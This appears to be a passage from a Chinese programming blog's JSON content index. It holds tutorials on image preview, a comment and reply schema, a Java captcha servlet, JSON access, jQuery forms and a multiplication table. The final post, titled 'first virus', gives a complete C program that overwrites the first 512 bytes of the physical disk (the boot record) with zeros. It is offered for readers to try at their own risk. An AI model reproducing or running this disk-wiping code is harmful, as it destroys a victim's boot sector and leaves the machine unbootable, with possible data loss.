0; &#125;; function isLessThanOrEqualTo(other) &#123; return this.compareTo(other) &lt;= 0; &#125;; function isPositive() &#123; return this.compareTo(BigDecimal.prototype.ZERO) &gt; 0; &#125;; function isNegative() &#123; return this.compareTo(BigDecimal.prototype.ZERO) &lt; 0; &#125;; function isZero() &#123; return this.compareTo(BigDecimal.prototype.ZERO) === 0; &#125;;return BigDecimal;&#125;)(MathContext); // BigDecimal depends on MathContextif (typeof define === \"function\" &amp;&amp; define.amd != null) &#123; // AMD-loader compatible resource declaration // require('bigdecimal') will return JS Object: // &#123;'BigDecimal':BigDecimalPointer, 'MathContext':MathContextPointer&#125; define(&#123;'BigDecimal':BigDecimal, 'MathContext':MathContext&#125;);&#125; else if (typeof this === \"object\")&#123; // global-polluting outcome. this.BigDecimal = BigDecimal; this.MathContext = MathContext;&#125;&#125;).call(this); // in browser 'this' will be 'window' or simulated window object in AMD-loading scenarios.","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"bigdecimal","slug":"bigdecimal","permalink":"https://xxzkid.github.io/tags/bigdecimal/"}]},{"title":"js实现图片预览","slug":"js-pic-preview","date":"2015-03-05T15:30:51.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2015/js-pic-preview/","link":"","permalink":"https://xxzkid.github.io/2015/js-pic-preview/","excerpt":"本篇文章讲解如何使用js实现图片预览功能","text":"本篇文章讲解如何使用js实现图片预览功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;图片预览&lt;/title&gt;&lt;script type=\"text/javascript\"&gt;//图片上传预览 IE是用了滤镜。function previewImage(file) &#123;var div = document.getElementById('previmage');var oldimg = div.firstChild;var w = oldimg.style.width;var h = oldimg.style.height;// console.log(w + ',' + h);if (file.files &amp;&amp; file.files[0]) &#123;div.innerHTML = \"\";var img = document.createElement(\"img\");img.style.width = w;img.style.height = h;div.appendChild(img);img.src = window.URL.createObjectURL(file.files[0]);&#125; else //兼容IE&#123;file.select();file.blur();var imgSrc = document.selection.createRange().text;//必须设置初始大小div.style.width = w;div.style.height = h;//图片异常的捕捉，防止用户修改后缀来伪造图片div.style.filter = \"progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod=scale)\";div.filters.item(\"DXImageTransform.Microsoft.AlphaImageLoader\").src = imgSrc;oldimg.style.display = \"none\";document.selection.empty();&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;By xxzkid&lt;/p&gt;&lt;!-- 图片预览 --&gt;&lt;div&gt;&lt;input type=\"file\" onchange=\"previewImage(this);\" /&gt;&lt;div id=\"previmage\"&gt;&lt;img src=\"\" style=\"width: 200px; height: 200px;\" /&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- PS：#previmage &gt; img 的width and height 一定要写在标签上，用class 或者id 选择器写的样式，在js中无法获取 --&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"预览","slug":"预览","permalink":"https://xxzkid.github.io/tags/预览/"}]},{"title":"模仿qq空间评论以及回复","slug":"qqzone-comment-reply","date":"2014-12-18T22:48:24.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2014/qqzone-comment-reply/","link":"","permalink":"https://xxzkid.github.io/2014/qqzone-comment-reply/","excerpt":"本篇文章讲解如何模仿qq空间评论以及回复代码实现和表结构的设计 先看需求是怎么样的：","text":"本篇文章讲解如何模仿qq空间评论以及回复代码实现和表结构的设计 先看需求是怎么样的： 再看评论表结构的设计： 123456789101112create table t_comment( id varchar(32) primary key, #主键Id customer_id varchar(32) not null, #用户Id parent_comment_id varchar(32) not null, #父评论Id content_id varchar(32) not null, #评论对象的Id type int(11), #评论对象的类型 content varchar(140) null, #评论内容 comment_date varchar(10) null, #评论日期 comment_time varchar(12) null, #评论时间 state int(11) null #评论的状态 0显示或者1不显示); 在看实体的设计： 123456789101112131415161718public class Comment &#123; private String id;// id private String customerId;// 用户id private String parentCommentId;// 父评论id private String contentId;// 内容id private String content;// 评论内容 private String commetDate;// 评论日期 private String commetTime;// 评论时间 private Integer state;// 评论的状态 private Integer type;// 评论类型 //================================= private List&lt;Comment&gt; replyComment; // 评论回复信息 private Customer customer;// 评论者信息 private Customer replyCustomer; // 回复评论的人 // 省略了getter/setter&#125; 分析问题的解决方案，我先说说我解决问题的方案： 首先根据我们要评论的对象得Id，查询出评论该对象的所有父评论； 然后根据父评论的Id去查询子评论的信息。 分析完毕后：我们开始写sql： 下面的t_item 为评论对象中的一种类型， 他的类型码为1 所有tco.type = 1 12345678SELECT tco.* FROM t_comment tco LEFT JOIN t_item tit ON tco.content_id = tit.id WHERE tco.parent_comment_id IS NULL AND tco.type = 1 AND comment.state = 0 AND tit.id = #&#123;itemId&#125; ORDER BY tco.comment_date DESC, tco.comment_time DESC 以上为查询所有的父评论信息； 然后我们再根据父评论的Id查询子评论的信息： 123SELECT tco.* FROM t_comment tco WHERE tco.parent_comment_id = #&#123;parentCommentId&#125; AND comment.state = 0 以上是查询子评论的信息 通过上面的sql，我们只是简单的查询了语句： 我们在看看java中怎么去构建评论的集合 dao的编写：就是把以上的两个sql语句变成两个方法。 根据评论对象的Id查询所有父评论：List\\ findParentCommentByItemId(String itemId, int offset, int limit); 根据父评论的Id查询所有子评论：List\\ findReplyCommentByCommentId(String parentCommentId, int offset, int limit); 然后我们看service怎么实现： 根据评论对象的Id查询所有评论：List\\ findCommentByItemId(String itemId, int offset, int limit); 具体的实现： 12345678910111213public List&lt;Comment&gt; findCommentByItemId(String itemId, int offset, int limit) &#123; List&lt;Comment&gt; comments = commentDao.findParentCommentByItemId(itemId, offset, limit); for(Comment comment : comments)&#123; List&lt;Comment&gt; replys = new ArrayList&lt;Comment&gt;(); // 实例化回复的集合 comment.setReplyComment(replys); // 设置评论的回复集合 String customerId = comment.getCustomerId(); // 获取评论的人的Id Customer customer = customerService.getCustomerByCustomerId(customerId); // 通过评论人的Id获取评论人的信息 if(customer != null) customer.setPassword(null); // 把评论的人的密码设置为空 comment.setCustomer(customer); // 设置评论的人的信息 buildReplyComment(comment, replys, offset, limit); // 构建评论与回复信息 &#125; return comments; &#125; 12345678910111213141516171819/** * 构建评论与回复评论的关系 * @param comment * @param offset * @param limit */ private void buildReplyComment(Comment comment, List&lt;Comment&gt; replys, int offset, int limit)&#123; List&lt;Comment&gt; replyComments = commentDao.findReplyCommentByCommentId(comment.getId(), offset, limit); // 获取评论的所有回复 replys.addAll(replyComments); // 把所有的回复添加到评论实例化的回复集合中 for(Comment c : replyComments)&#123; // 遍历回复中的回复 String customerId = c.getCustomerId(); // 获取回复人的id Customer replyCustomer = customerService.getCustomerByCustomerId(customerId); // 获取回复人信息 if(replyCustomer != null) replyCustomer.setPassword(null); // 把回复人的密码设置为空 Customer customer = customerService.getCustomerByCustomerId(comment.getCustomerId()); // 获取评论人的信息 c.setCustomer(customer); // 设置评论人的信息 c.setReplyCustomer(replyCustomer); // 设置回复人的信息 buildReplyComment(c, replys, offset, limit); // 递归调用 &#125; &#125; 最后看页面的展示： 12345678910111213&lt;c:forEach var=\"comment\" items=\"$&#123;itemComments&#125;\"&gt;&lt;c:out value=\"$&#123;comment.customer.nickName&#125;\"/&gt;:&lt;span class=\"ellipsis\"&gt;$&#123;comment.content&#125;&lt;/span&gt;&lt;span class=\"ellipsis\"&gt;(&lt;c:out value=\"$&#123;comment.commetDate&#125;\" /&gt;)&lt;/span&gt;&lt;c:if test=\"$&#123;!empty comment.replyComment&#125;\"&gt;&lt;c:forEach var=\"reply\" items=\"$&#123;comment.replyComment&#125;\"&gt;$&#123;reply.replyCustomer.nickName&#125;回复了$&#123;reply.customer.nickName&#125;&lt;span class=\"ellipsis\"&gt;$&#123;reply.content&#125;&lt;/span&gt;&lt;span class=\"ellipsis\"&gt;(&lt;c:out value=\"$&#123;comment.commetDate&#125;\" /&gt;)&lt;/span&gt;&lt;/c:forEach&gt;&lt;/c:if&gt;&lt;/c:forEach&gt; 样式方面需要调整，大体的功能就这个样子了， 还有不足请指出来，谢谢","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"设计","slug":"设计","permalink":"https://xxzkid.github.io/tags/设计/"},{"name":"sql","slug":"sql","permalink":"https://xxzkid.github.io/tags/sql/"}]},{"title":"java验证码","slug":"java-checkcode","date":"2014-11-18T00:00:00.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2014/java-checkcode/","link":"","permalink":"https://xxzkid.github.io/2014/java-checkcode/","excerpt":"这篇文章主要讲解如何用java实现验证码","text":"这篇文章主要讲解如何用java实现验证码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package org.xxz.checkcode;import java.awt.Color;import java.awt.Font;import java.awt.Graphics;import java.awt.Graphics2D;import java.awt.image.BufferedImage;import java.io.IOException;import java.util.Random;import javax.imageio.ImageIO;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class CheckCode extends HttpServlet&#123; private static final long serialVersionUID = 1L; private static final int WIDTH = 120; private static final int HEIGHT = 35; public void doGet( HttpServletRequest request, HttpServletResponse response ) throws ServletException, IOException &#123; try &#123; test( request, response ); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; public void doPost( HttpServletRequest request, HttpServletResponse response ) throws ServletException, IOException &#123; doGet( request, response ); &#125; public void test( HttpServletRequest request, HttpServletResponse response ) throws Exception &#123; BufferedImage image = new BufferedImage( WIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB ); Graphics g = image.getGraphics();/* 设置背景色 */ setBackGround( g );/* 设置边框 */ setBorder( g );/* 画干扰线 */ drawRandomLine( g );/* 写随机数 */ String random = drawRandomNum( (Graphics2D) g ); request.getSession().setAttribute( &quot;checkcode&quot;, random );/* 这三个头是决定所有的浏览器不缓存 */ response.setDateHeader( &quot;expries&quot;, -1 ); response.setHeader( &quot;Cache-Control&quot;, &quot;no-cache&quot; ); response.setHeader( &quot;Pragma&quot;, &quot;no-cache&quot; ); ImageIO.write( image, &quot;jpg&quot;, response.getOutputStream() ); &#125; private void drawRandomLine( Graphics g ) &#123; g.setColor( Color.GREEN ); for ( int i = 0; i &lt; 6; i++ ) &#123; int x1 = new Random().nextInt( WIDTH ); int y1 = new Random().nextInt( HEIGHT ); int x2 = new Random().nextInt( WIDTH ); int y2 = new Random().nextInt( HEIGHT ); g.drawLine( x1, y1, x2, y2 ); &#125; &#125; private String drawRandomNum( Graphics2D g ) &#123; g.setColor( Color.RED ); g.setFont( new Font( &quot;宋体&quot;, Font.BOLD, 20 ) ); String cnCode = &quot;\\u7684\\u4e00\\u662f\\u4e86\\u6211\\u4e0d\\u4eba\\u5728\\u4ed6\\u6709\\u8fd9\\u4e2a\\u4e0a\\u4eec\\u6765\\u5230\\u65f6\\u5927\\u5730\\u4e3a\\u5b50\\u4e2d\\u4f60\\u8bf4\\u751f\\u56fd\\u5e74\\u7740\\u5c31\\u90a3\\u548c\\u8981\\u5979\\u51fa\\u4e5f\\u5f97\\u91cc\\u540e\\u81ea\\u4ee5\\u4f1a\\u5bb6\\u53ef\\u4e0b\\u800c\\u8fc7\\u5929\\u53bb\\u80fd\\u5bf9\\u5c0f\\u591a\\u7136\\u4e8e\\u5fc3\\u5b66\\u4e48\\u4e4b\\u90fd\\u597d\\u770b\\u8d77\\u53d1\\u5f53\\u6ca1\\u6210\\u53ea\\u5982\\u4e8b\\u628a\\u8fd8\\u7528\\u7b2c\\u6837\\u9053\\u60f3\\u4f5c\\u79cd\\u5f00\\u7f8e\\u603b\\u4ece\\u65e0\\u60c5\\u5df1\\u9762\\u6700\\u5973\\u4f46\\u73b0\\u524d\\u4e9b\\u6240\\u540c\\u65e5\\u624b\\u53c8\\u884c\\u610f\\u52a8\\u65b9\\u671f\\u5b83\\u5934\\u7ecf\\u957f\\u513f\\u56de\\u4f4d\\u5206\\u7231\\u8001\\u56e0\\u5f88\\u7ed9\\u540d\\u6cd5\\u95f4\\u65af\\u77e5\\u4e16\\u4ec0\\u4e24\\u6b21\\u4f7f\\u8eab\\u8005\\u88ab\\u9ad8\\u5df2\\u4eb2\\u5176\\u8fdb\\u6b64\\u8bdd\\u5e38\\u4e0e\\u6d3b\\u6b63\\u611f\\u89c1\\u660e\\u95ee\\u529b\\u7406\\u5c14\\u70b9\\u6587\\u51e0\\u5b9a\\u672c\\u516c\\u7279\\u505a\\u5916\\u5b69\\u76f8\\u897f\\u679c\\u8d70\\u5c06\\u6708\\u5341\\u5b9e\\u5411\\u58f0\\u8f66\\u5168\\u4fe1\\u91cd\\u4e09\\u673a\\u5de5\\u7269\\u6c14\\u6bcf\\u5e76\\u522b\\u771f\\u6253\\u592a\\u65b0\\u6bd4\\u624d\\u4fbf\\u592b\\u518d\\u4e66\\u90e8\\u6c34\\u50cf\\u773c\\u7b49\\u4f53\\u5374\\u52a0\\u7535\\u4e3b\\u754c\\u95e8\\u5229\\u6d77\\u53d7\\u542c\\u8868\\u5fb7\\u5c11\\u514b\\u4ee3\\u5458\\u8bb8\\u7a1c\\u5148\\u53e3\\u7531\\u6b7b\\u5b89\\u5199\\u6027\\u9a6c\\u5149\\u767d\\u6216\\u4f4f\\u96be\\u671b\\u6559\\u547d\\u82b1\\u7ed3\\u4e50\\u8272\\u66f4\\u62c9\\u4e1c\\u795e\\u8bb0\\u5904\\u8ba9\\u6bcd\\u7236\\u5e94\\u76f4\\u5b57\\u573a\\u5e73\\u62a5\\u53cb\\u5173\\u653e\\u81f3\\u5f20\\u8ba4\\u63a5\\u544a\\u5165\\u7b11\\u5185\\u82f1\\u519b\\u5019\\u6c11\\u5c81\\u5f80\\u4f55\\u5ea6\\u5c71\\u89c9\\u8def\\u5e26\\u4e07\\u7537\\u8fb9\\u98ce\\u89e3\\u53eb\\u4efb\\u91d1\\u5feb\\u539f\\u5403\\u5988\\u53d8\\u901a\\u5e08\\u7acb\\u8c61\\u6570\\u56db\\u5931\\u6ee1\\u6218\\u8fdc\\u683c\\u58eb\\u97f3\\u8f7b\\u76ee\\u6761\\u5462\\u75c5\\u59cb\\u8fbe\\u6df1\\u5b8c\\u4eca\\u63d0\\u6c42\\u6e05\\u738b\\u5316\\u7a7a\\u4e1a\\u601d\\u5207\\u600e\\u975e\\u627e\\u7247\\u7f57\\u94b1\\u7d36\\u5417\\u8bed\\u5143\\u559c\\u66fe\\u79bb\\u98de\\u79d1\\u8a00\\u5e72\\u6d41\\u6b22\\u7ea6\\u5404\\u5373\\u6307\\u5408\\u53cd\\u9898\\u5fc5\\u8be5\\u8bba\\u4ea4\\u7ec8\\u6797\\u8bf7\\u533b\\u665a\\u5236\\u7403\\u51b3\\u7aa2\\u4f20\\u753b\\u4fdd\\u8bfb\\u8fd0\\u53ca\\u5219\\u623f\\u65e9\\u9662\\u91cf\\u82e6\\u706b\\u5e03\\u54c1\\u8fd1\\u5750\\u4ea7\\u7b54\\u661f\\u7cbe\\u89c6\\u4e94\\u8fde\\u53f8\\u5df4\\u5947\\u7ba1\\u7c7b\\u672a\\u670b\\u4e14\\u5a5a\\u53f0\\u591c\\u9752\\u5317\\u961f\\u4e45\\u4e4e\\u8d8a\\u89c2\\u843d\\u5c3d\\u5f62\\u5f71\\u7ea2\\u7238\\u767e\\u4ee4\\u5468\\u5427\\u8bc6\\u6b65\\u5e0c\\u4e9a\\u672f\\u7559\\u5e02\\u534a\\u70ed\\u9001\\u5174\\u9020\\u8c08\\u5bb9\\u6781\\u968f\\u6f14\\u6536\\u9996\\u6839\\u8bb2\\u6574\\u5f0f\\u53d6\\u7167\\u529e\\u5f3a\\u77f3\\u53e4\\u534e\\u8ae3\\u62ff\\u8ba1\\u60a8\\u88c5\\u4f3c\\u8db3\\u53cc\\u59bb\\u5c3c\\u8f6c\\u8bc9\\u7c73\\u79f0\\u4e3d\\u5ba2\\u5357\\u9886\\u8282\\u8863\\u7ad9\\u9ed1\\u523b\\u7edf\\u65ad\\u798f\\u57ce\\u6545\\u5386\\u60ca\\u8138\\u9009\\u5305\\u7d27\\u4e89\\u53e6\\u5efa\\u7ef4\\u7edd\\u6811\\u7cfb\\u4f24\\u793a\\u613f\\u6301\\u5343\\u53f2\\u8c01\\u51c6\\u8054\\u5987\\u7eaa\\u57fa\\u4e70\\u5fd7\\u9759\\u963f\\u8bd7\\u72ec\\u590d\\u75db\\u6d88\\u793e\\u7b97\\u4e49\\u7adf\\u786e\\u9152\\u9700\\u5355\\u6cbb\\u5361\\u5e78\\u5170\\u5ff5\\u4e3e\\u4ec5\\u949f\\u6015\\u5171\\u6bdb\\u53e5\\u606f\\u529f\\u5b98\\u5f85\\u7a76\\u8ddf\\u7a7f\\u5ba4\\u6613\\u6e38\\u7a0b\\u53f7\\u5c45\\u8003\\u7a81\\u76ae\\u54ea\\u8d39\\u5012\\u4ef7\\u56fe\\u5177\\u521a\\u8111\\u6c38\\u6b4c\\u54cd\\u5546\\u793c\\u7ec6\\u4e13\\u9ec4\\u5757\\u811a\\u5473\\u7075\\u6539\\u636e\\u822c\\u7834\\u5f15\\u98df\\u4ecd\\u5b58\\u4f17\\u6ce8\\u7b14\\u751a\\u67d0\\u6c89\\u8840\\u5907\\u4e60\\u6821\\u9ed8\\u52a1\\u571f\\u5fae\\u5a18\\u987b\\u8bd5\\u6000\\u6599\\u8c03\\u5e7f\\u8716\\u82cf\\u663e\\u8d5b\\u67e5\\u5bc6\\u8bae\\u5e95\\u5217\\u5bcc\\u68a6\\u9519\\u5ea7\\u53c2\\u516b\\u9664\\u8dd1\\u4eae\\u5047\\u5370\\u8bbe\\u7ebf\\u6e29\\u867d\\u6389\\u4eac\\u521d\\u517b\\u9999\\u505c\\u9645\\u81f4\\u9633\\u7eb8\\u674e\\u7eb3\\u9a8c\\u52a9\\u6fc0\\u591f\\u4e25\\u8bc1\\u5e1d\\u996d\\u5fd8\\u8da3\\u652f\\u6625\\u96c6\\u4e08\\u6728\\u7814\\u73ed\\u666e\\u5bfc\\u987f\\u7761\\u5c55\\u8df3\\u83b7\\u827a\\u516d\\u6ce2\\u5bdf\\u7fa4\\u7687\\u6bb5\\u6025\\u5ead\\u521b\\u533a\\u5965\\u5668\\u8c22\\u5f1f\\u5e97\\u5426\\u5bb3\\u8349\\u6392\\u80cc\\u6b62\\u7ec4\\u5dde\\u671d\\u5c01\\u775b\\u677f\\u89d2\\u51b5\\u66f2\\u9986\\u80b2\\u5fd9\\u8d28\\u6cb3\\u7eed\\u54e5\\u547c\\u82e5\\u63a8\\u5883\\u9047\\u96e8\\u6807\\u59d0\\u5145\\u56f4\\u6848\\u4f26\\u62a4\\u51b7\\u8b66\\u8d1d\\u8457\\u96ea\\u7d22\\u5267\\u554a\\u8239\\u9669\\u70df\\u4f9d\\u6597\\u503c\\u5e2e\\u6c49\\u6162\\u4f5b\\u80af\\u95fb\\u5531\\u6c99\\u5c40\\u4f2f\\u65cf\\u4f4e\\u73a9\\u8d44\\u5c4b\\u51fb\\u901f\\u987e\\u6cea\\u6d32\\u56e2\\u5723\\u65c1\\u5802\\u5175\\u4e03\\u9732\\u56ed\\u725b\\u54ed\\u65c5\\u8857\\u52b3\\u578b\\u70c8\\u59d1\\u9648\\u83ab\\u9c7c\\u5f02\\u62b1\\u5b9d\\u6743\\u9c81\\u7b80\\u6001\\u7ea7\\u7968\\u602a\\u5bfb\\u6740\\u5f8b\\u80dc\\u4efd\\u6c7d\\u53f3\\u6d0b\\u8303\\u5e8a\\u821e\\u79d8\\u5348\\u767b\\u697c\\u8d35\\u5438\\u8d23\\u4f8b\\u8ffd\\u8f83\\u804c\\u5c5e\\u6e10\\u5de6\\u5f55\\u4e1d\\u7259\\u515a\\u7ee7\\u6258\\u8d76\\u7ae0\\u667a\\u51b2\\u53f6\\u80e1\\u5409\\u5356\\u575a\\u559d\\u8089\\u9057\\u6551\\u4fee\\u677e\\u4e34\\u85cf\\u62c5\\u620f\\u5584\\u536b\\u836f\\u60b2\\u6562\\u9760\\u4f0a\\u6751\\u6234\\u8bcd\\u68ee\\u8033\\u5dee\\u77ed\\u7956\\u4e91\\u89c4\\u7a97\\u6563\\u8ff7\\u6cb9\\u65e7\\u9002\\u4e61\\u67b6\\u6069\\u6295\\u5f39\\u94c1\\u535a\\u96f7\\u5e9c\\u538b\\u8d85\\u8d1f\\u52d2\\u6742\\u9192\\u6d17\\u91c7\\u6beb\\u5634\\u6bd5\\u4e5d\\u51b0\\u65e2\\u72b6\\u4e71\\u666f\\u5e2d\\u73cd\\u7ae5\\u9876\\u6d3e\\u7d20\\u8131\\u519c\\u7591\\u7ec3\\u91ce\\u6309\\u72af\\u62cd\\u5f81\\u574f\\u9aa8\\u4f59\\u627f\\u7f6e\\u81d3\\u5f69\\u706f\\u5de8\\u7434\\u514d\\u73af\\u59c6\\u6697\\u6362\\u6280\\u7ffb\\u675f\\u589e\\u5fcd\\u9910\\u6d1b\\u585e\\u7f3a\\u5fc6\\u5224\\u6b27\\u5c42\\u4ed8\\u9635\\u739b\\u6279\\u5c9b\\u9879\\u72d7\\u4f11\\u61c2\\u6b66\\u9769\\u826f\\u6076\\u604b\\u59d4\\u62e5\\u5a1c\\u5999\\u63a2\\u5440\\u8425\\u9000\\u6447\\u5f04\\u684c\\u719f\\u8bfa\\u5ba3\\u94f6\\u52bf\\u5956\\u5bab\\u5ffd\\u5957\\u5eb7\\u4f9b\\u4f18\\u8bfe\\u9e1f\\u558a\\u964d\\u590f\\u56f0\\u5218\\u7f6a\\u4ea1\\u978b\\u5065\\u6a21\\u8d25\\u4f34\\u5b88\\u6325\\u9c9c\\u8d22\\u5b64\\u67aa\\u7981\\u6050\\u4f19\\u6770\\u8ff9\\u59b9\\u85f8\\u904d\\u76d6\\u526f\\u5766\\u724c\\u6c5f\\u987a\\u79cb\\u8428\\u83dc\\u5212\\u6388\\u5f52\\u6d6a\\u542c\\u51e1\\u9884\\u5976\\u96c4\\u5347\\u7883\\u7f16\\u5178\\u888b\\u83b1\\u542b\\u76db\\u6d4e\\u8499\\u68cb\\u7aef\\u817f\\u62db\\u91ca\\u4ecb\\u70e7\\u8bef&quot;; StringBuffer sb = new StringBuffer();/* 汉字区间 [\\u4e00-\\u9fa5] */ int x = 5; for ( int i = 0; i &lt; 4; i++ ) &#123; int degree = new Random().nextInt() % 30; String ch = cnCode.charAt( new Random().nextInt( cnCode.length() ) ) + &quot;&quot;; sb.append( ch );/* 设置旋转的弧度 */ g.rotate( degree * Math.PI / 180, x, 20 ); g.drawString( ch, x, 20 ); g.rotate( -degree * Math.PI / 180, x, 20 ); x += 30; &#125; return(sb.toString() ); &#125; private void setBackGround( Graphics g ) &#123; g.setColor( Color.WHITE ); g.fillRect( 0, 0, WIDTH, HEIGHT ); &#125; private void setBorder( Graphics g ) &#123; g.setColor( Color.BLUE ); g.drawRect( 1, 1, WIDTH - 2, HEIGHT - 2 ); &#125;&#125; 显 示 4 个 中文字 符","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"验证码","slug":"验证码","permalink":"https://xxzkid.github.io/tags/验证码/"}]},{"title":"json取值方法","slug":"json-get-value-method","date":"2014-08-20T15:27:56.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2014/json-get-value-method/","link":"","permalink":"https://xxzkid.github.io/2014/json-get-value-method/","excerpt":"本篇文章讲解json取值的两种方式 在js中有两种方式是用来取出json中的值","text":"本篇文章讲解json取值的两种方式 在js中有两种方式是用来取出json中的值 .的方式取值(data.key) []的方式取值(data[key]) 看下面的一个例子： 12345678910var json=&#123; r1:'123', r2:'123', r3:'123', r4:'123', r5:'123', r6:'123', r7:'123', r8:'123' &#125; 我们要取出每一个元素，肯定最简单方法就是循环遍历了。 123456for(var i=1;i&lt;=8；i++)&#123; //但是这里如果使用第一种方式，这样调用是不行的，我们必须使用第二种方式调用。 //var t = \"r\"+i; //var value = json.t; // 但是你这样写是可以的:json.\"r1\",就是不能进行变量的拼接 var value = json[\"r\"+i]; &#125; 就是这么简单，哈哈","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"json","slug":"json","permalink":"https://xxzkid.github.io/tags/json/"}]},{"title":"jquery动态生成表单提交","slug":"jquery-build-form","date":"2014-08-20T15:11:19.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2014/jquery-build-form/","link":"","permalink":"https://xxzkid.github.io/2014/jquery-build-form/","excerpt":"我们有时候在提交一些参数的时候不想写隐藏表单时，我们可以使用jquery动态生成form但是在动态生成表单时，不同浏览器兼容性是不一样的。","text":"我们有时候在提交一些参数的时候不想写隐藏表单时，我们可以使用jquery动态生成form但是在动态生成表单时，不同浏览器兼容性是不一样的。 所以会遇到一些问题，可能你在chrome上能够运行，但是IE上不一定能够运行，我今天遇到的问题就是我做一个导出Excel需要带参数的跳转，window.location.href的方式满足不了我的需求，所有就用到了动态生成form使用jquery生成form很简单下面是一段简单的代码 12345678910111213var result = $('#printDIV').html();var xlsName = \"excel文件\";var url = \"exportExcel/export\";var form = $(\"&lt;form&gt;&lt;/form&gt;\");form.attr(\"action\", url);form.attr(\"method\", \"post\");form.append(\"&lt;textarea name='result'&gt;\"+result+\"&lt;/textarea&gt;\");form.append(\"&lt;textarea name='xlsName'&gt;\"+ xlsName +\"&lt;/textarea&gt;\");// ie8 必须要使用 appendTo(\"body\") 经过测试// chrome 35.0 版本是可以不需要 appendTo(\"body\")form.appendTo(\"body\").submit();// 渲染成功后移除表单form，否则页面中会出现表单form.remove(); 解决办法就是加上appendTo(“body”);","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"jquery","slug":"jquery","permalink":"https://xxzkid.github.io/tags/jquery/"},{"name":"form","slug":"form","permalink":"https://xxzkid.github.io/tags/form/"}]},{"title":"javascript写九九乘法表","slug":"javascript-jiujiuchengfabiao","date":"2013-03-10T00:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2013/javascript-jiujiuchengfabiao/","link":"","permalink":"https://xxzkid.github.io/2013/javascript-jiujiuchengfabiao/","excerpt":"这篇文章主要讲解 九九乘法表","text":"这篇文章主要讲解 九九乘法表123456789101112131415161718192021222324&lt;html&gt; &lt;head&gt; &lt;style type=&quot;text/css&quot;&gt; tr td&#123; border:2px solid green; font-size:20px; font-weight:bold; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;&lt;table&gt;&quot;); for(var x=1;x&lt;=9;x++)&#123; document.write(&quot;&lt;tr&gt;&quot;); for(var y=1;y&lt;=x;y++)&#123; document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;) &#125; document.write(&quot;&lt;/tr&gt;&quot;); &#125; document.write(&quot;&lt;/table&gt;&quot;); &lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"}]},{"title":"第一个病毒","slug":"first-virus","date":"2013-03-10T00:00:00.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2013/first-virus/","link":"","permalink":"https://xxzkid.github.io/2013/first-virus/","excerpt":"这篇文章主要讲解 使用c写一个小程序下面是初学c语言写的代码（测试，自行承担后果哦）：","text":"这篇文章主要讲解 使用c写一个小程序下面是初学c语言写的代码（测试，自行承担后果哦）：123456789101112131415#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() &#123; char buffer[512]=&quot;0&quot;; FILE * fd=fopen(&quot;\\\\\\\\.\\\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); if (fd == NULL) return 0; fseek(fd,0,SEEK_SET); fwrite(buffer,512,1,fd); printf(&quot;hello,你中毒了！\\n&quot;); fclose(fd); return 0; &#125;","categories":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/categories/c/"}],"tags":[{"name":"c","slug":"c","permalink":"https://xxzkid.github.io/tags/c/"},{"name":"病毒","slug":"病毒","permalink":"https://xxzkid.github.io/tags/病毒/"}]}]}